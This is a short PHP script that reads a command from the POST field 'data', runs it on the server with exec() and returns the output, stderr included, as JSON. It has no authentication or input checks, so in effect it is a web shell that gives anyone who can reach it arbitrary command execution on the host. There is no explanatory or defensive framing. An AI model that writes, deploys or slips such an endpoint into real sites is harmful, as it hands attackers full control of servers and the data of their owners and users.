<?php
	$command = $_POST['data'];				  //Grab the requested command
	$command = $command." 2>&1";			  //Redirect stderr back to our output

	exec($command,$output);					  //Execute out command.
	
	echo json_encode($output);				 	  //serialize and return.
?>
